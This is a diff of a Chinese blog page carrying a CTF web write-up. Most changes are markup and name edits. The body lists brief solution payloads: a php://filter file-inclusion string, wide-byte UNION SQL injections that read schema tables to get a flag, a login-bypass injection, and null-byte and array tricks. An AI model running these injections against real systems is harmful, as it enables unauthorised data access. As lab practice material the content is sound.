@@ -25,7 +25,7 @@
     <meta http-equiv="X-UA-Compatible">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="theme-color" content="#0097A7">
-    <meta name="author" content="George Lee">
+    <meta name="author" content="Geroge Lee">
     <meta name="description" content="Nothing is difficult to the man who will try.">
     <meta name="keywords" content="personal blog">
 
@@ -288,7 +288,7 @@
     </div>
     <!-- Author Name & Date -->
     <div>
-        <strong>George Lee</strong>
+        <strong>Geroge Lee</strong>
         <span>3月 29, 2017</span>
     </div>
 
@@ -367,12 +367,6 @@
 
     <!-- Share LinkedIn -->
     
-        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=http://lzx.dropsec.xyz//2017/03/29/南邮ctf-web/index.html&title=南邮ctf web" target="_blank">
-            <li class="mdl-menu__item">
-                分享到 LinkedIn
-            </li>
-        </a>
-    
 
     <!-- Share QQ -->
     
@@ -398,7 +392,7 @@
 <p>查看源码就可得到</p>
 <p><strong>md5 collision</strong></p>
 <p>Poc:a=240610708</p>
-<p>&lt;!--more--&gt;</p>
+<a id="more"></a>
 <p><img src="http://obh16g4rw.bkt.clouddn.com/%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE20160901180637.png" alt=""></p>
 <p><strong>签到2</strong></p>
 <p>关键点：输入框设定了最大的长度限制</p>
@@ -409,7 +403,7 @@
 <p><strong>单身二十年</strong></p>
 <p>源码点击./search_key.php，getflag</p>
 <p><strong>你从哪里来</strong></p>
-<p>referer: http://www.google.com</p>
+<p>referer: <a href="http://www.google.com" target="_blank" rel="external">http://www.google.com</a></p>
 <p><strong>文件包含</strong></p>
 <p>Poc：file=php://filter/convert.base64-encode/resource=index.php</p>
 <p><strong>单身一百年也没用</strong></p>
@@ -423,14 +417,14 @@
 <p>2、sql.php?id=1024.00001</p>
 <p><strong>sql injection 3</strong></p>
 <p>id=2,gbk</p>
-<p>id=1%df' union select 1,2 --+</p>
-<p>id=1%df' union select database(),2 --+</p>
+<p>id=1%df’ union select 1,2 –+</p>
+<p>id=1%df’ union select database(),2 –+         </p>
 <p>回显sqli</p>
-<p>id=1%df' union select 1,table_name from information_schema.tables where table_schema=0x73716C6931</p>
+<p>id=1%df’ union select 1,table_name from information_schema.tables where table_schema=0x73716C6931</p>
 <p>回显 falg</p>
-<p>id=1%df' union select 1,cloumn_name from information_schema.columns where table_schema=0x73716C6931</p>
+<p>id=1%df’ union select 1,cloumn_name from information_schema.columns where table_schema=0x73716C6931</p>
 <p>回显 fl4g</p>
-<p>id=1%df' union select 1,fl4g from  flag --+</p>
+<p>id=1%df’ union select 1,fl4g from  flag –+</p>
 <p><strong>/x00</strong></p>
 <p>Poc:nctf[]=1.#biubiubiu</p>
 <p><strong>bypass again</strong></p>
@@ -444,7 +438,7 @@
 <p><strong>上传绕过</strong></p>
 <p>截断 <a href="http://www.myhack58.com/Article/html/3/8/2013/36507.htm" target="_blank" rel="external">截断上传绕过</a></p>
 <p><strong>SQL注入1</strong></p>
-<p>admin')#&amp;111</p>
+<p>admin’)#&amp;111</p>
 <p><strong>pass check</strong></p>
 <p>输入123，抓包改为传入数组</p>
 <p><strong>起名字真难</strong></p>
@@ -524,7 +518,7 @@
 
     <!-- Sidebar Avatar -->
     <div class="sidebar-image">
-        <img src="/img/avatar.png" alt="George Lee's avatar">
+        <img src="/img/avatar.png" alt="Geroge Lee's avatar">
     </div>
 
     <!-- Sidebar Email -->
@@ -591,7 +585,7 @@
         <li class="dropdown">
             <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
                 
-                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                    <i class="material-icons sidebar-material-icons">inbox</i>
                 
                 分类
                 <b class="caret"></b>
